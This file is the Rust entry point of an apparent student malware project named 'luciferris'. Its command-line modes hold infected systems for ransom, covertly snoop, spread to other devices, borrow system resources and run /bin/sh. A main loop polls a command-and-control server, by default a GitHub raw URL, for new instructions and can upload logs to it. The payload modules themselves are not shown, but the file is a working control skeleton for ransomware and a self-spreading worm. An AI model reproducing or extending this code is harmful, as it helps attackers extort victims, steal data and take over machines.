use clap::{Parser, Subcommand};
use config::{Config, ConfigError, FileFormat};
use env_logger::{fmt::Target, Builder};
use log::{error, info, warn, Level};
use serde::Deserialize;
use std::{io::Write, path::PathBuf};

mod borrow;
mod c2;
mod ransom;
mod snoop;
mod spread;

use borrow::*;
use c2::*;
use ransom::*;
use snoop::*;
use spread::*;

#[derive(Parser, Clone)]
#[command(author, version, about, long_about = None)]
struct Cli {
    /// Sets a custom config file
    #[arg(short, long, value_name = "FILE")]
    config: Option<String>,

    /// Set the logging info destination
    #[arg(short, long, value_name = "FILE")]
    output: Option<String>,

    /// Set the current working directory
    #[arg(short, long, value_name = "DIR")]
    pwd: Option<String>,

    /// Turn debugging information on
    #[arg(short, long, action = clap::ArgAction::Count)]
    debug: u8,

    #[command(subcommand)]
    mode: Option<Modes>,
}

#[derive(Subcommand, Clone, Deserialize)]
#[serde(rename_all = "lowercase")]
enum Modes {
    /// Utilize system resources
    Borrow,
    /// Hold the infected system for ransom
    Ransom,
    /// Gather information without being detected
    Snoop,
    /// Spread the running program to other devices    
    Spread,
    /// Dump the current configuration file
    DumpConfig,
    /// Call out to Command and Control (C2) server for instructions
    GetCommand,
    /// Upload logs to C2
    PostLog,
    /// Establish a new C2 server
    CnC,
}

fn main() {
    // get user input
    let cli = Cli::parse();

    // set up logging
    let mut out = String::new();
    let mut builder = Builder::from_default_env();
    builder.format(|buf, record| writeln!(buf, "{} - {}", record.level(), record.args()));
    // log to specified output file, if any
    if let Some(save_to) = cli.output.clone() {
        if let Ok(file) = std::fs::File::create(&save_to) {
            builder.target(Target::Pipe(Box::new(file)));
            out = String::from(&save_to);
        } else {
            builder.target(Target::Stdout);
        }
    }

    // set the logging verbosity
    let verbosity = match cli.debug {
        0 => Level::Error,
        1 => Level::Warn,
        2 => Level::Info,
        3 => Level::Debug,
        4 => Level::Trace,
        _ => {
            warn!("ignoring additional debug flags");
            Level::Trace
        }
    };
    builder.filter(None, verbosity.to_level_filter()).init();

    // Check if the user provided a working directory
    if let Some(pwd) = cli.pwd {
        match std::env::set_current_dir(pwd) {
            Ok(msg) => info!("{msg:?}"),
            Err(e) => error!("{e:?}"),
        }
    }

    let mut recent_mode: Option<Modes> = cli.mode;
    // Get the user specified config path, if any
    let mut conf: Option<Config> = match cli.config.as_deref() {
        Some(conf_path) => match read_config(conf_path) {
            Ok(out) => {
                info!("from path {conf_path} read config: {out:?}");
                recent_mode = get_mode(&Some(out.clone()));
                Some(out)
            }
            Err(e) => {
                error!("error reading config: {e}");
                None
            }
        },
        None => None,
    };

    let mut alive = true;
    while alive {
        // run the user specified mode
        if let Some(mode) = recent_mode.clone() {
            match mode.clone() {
                Modes::Borrow => borrow(get_exe(&conf), get_exeargs(&conf)),
                Modes::Ransom => ransom(&get_root(&conf), &get_c2(&conf)),
                Modes::Snoop => snoop(),
                Modes::Spread => spread(),
                Modes::DumpConfig => dumpconf(&conf),
                Modes::GetCommand => get_commands(get_c2s(&conf), get_docname(&conf)),
                Modes::PostLog => try_post_log(get_c2s(&conf), out.clone()),
                Modes::CnC => establish_c2(),
                _ => unreachable!(), // panics if code becomes not unreachable
            };

            get_commands(get_c2s(&conf), get_docname(&conf));
            info!("switching to new config");
            conf = read_config("./recent.json").ok();
            recent_mode = get_mode(&conf);
        } else {
            warn!("no mode specified, exiting logic loop");
            alive = false;
        }
    }

    info!("finished!");
}

fn read_config(path: &str) -> Result<Config, ConfigError> {
    info!("reading config from {path}");

    let builder = Config::builder()
        .set_default("default", "1")?
        .add_source(config::File::new(path, FileFormat::Json))
        .set_override("override", "1")?;

    builder.build()
}

fn dumpconf(conf: &Option<Config>) {
    if let Some(conf) = conf {
        info!("{conf:?}")
    } else {
        error!("could not dump configuration file {conf:?}")
    }
}

fn get_field<'de, T>(field: &str, config: &Option<Config>) -> Option<T>
where
    T: serde::de::Deserialize<'de>,
{
    // try to read the config
    if let Some(conf) = config {
        // query for field in config
        match conf.get::<T>(field) {
            Ok(t) => {
                info!("found field {field} in {config:?}");
                Some(t)
            }
            Err(e) => {
                error!("{e:?}");
                None
            }
        }
    } else {
        error!("could not find {field} in {config:?}");
        None
    }
}

fn get_mode(conf: &Option<Config>) -> Option<Modes> {
    if let Some(mode) = get_field("mode", conf) {
        Some(mode)
    } else {
        None
    }
}

fn get_root(conf: &Option<Config>) -> String {
    if let Some(root) = get_field("root", conf) {
        root
    } else {
        String::from("./")
    }
}

fn get_exe(conf: &Option<Config>) -> PathBuf {
    if let Some(exepath) = get_field("exepath", conf) {
        exepath
    } else {
        PathBuf::from("/bin/sh")
    }
}

fn get_exeargs(conf: &Option<Config>) -> Option<Vec<String>> {
    get_field("exeargs", conf)
}

fn get_c2(conf: &Option<Config>) -> String {
    if let Some(c2) = get_field("c2", conf) {
        c2
    } else {
        warn!("no c2 found, sensible default provided");
        String::from("localhost:8888")
    }
}

fn get_c2s(conf: &Option<Config>) -> Vec<String> {
    if let Some(c2s) = get_field("c2", conf) {
        c2s
    } else {
        warn!("no c2s found, sensible defaults provided");
        vec![String::from("https://raw.githubusercontent.com/gahill18/enpm697_finalproject/main/luciferris/example_configs/")]
    }
}

fn get_docname(conf: &Option<Config>) -> String {
    if let Some(docname) = get_field("c2docname", conf) {
        docname
    } else {
        String::from("get_command.json")
    }
}
